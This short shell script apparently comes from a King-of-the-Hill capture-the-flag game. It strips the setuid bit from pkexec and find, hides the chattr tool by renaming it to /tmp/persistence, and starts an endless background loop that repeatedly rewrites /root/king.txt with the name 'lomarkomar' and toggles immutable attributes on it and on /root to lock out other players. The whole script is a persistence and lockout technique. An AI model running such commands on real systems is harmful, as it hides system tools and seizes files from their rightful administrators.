sudo chmod -s /usr/bin/pkexec
sudo chmod -s $(which find)
sudo mv $(which chattr) /tmp/persistence
while true; do
    sudo /tmp/persistence -ia /root
    sudo /tmp/persistence -ia /root/king.txt 2>/dev/null
    sudo echo -n "lomarkomar" >| /root/king.txt 2>/dev/null
    sudo /tmp/persistence +ia /root/king.txt 2>/dev/null
    sudo /tmp/persistence +ia /root
done &
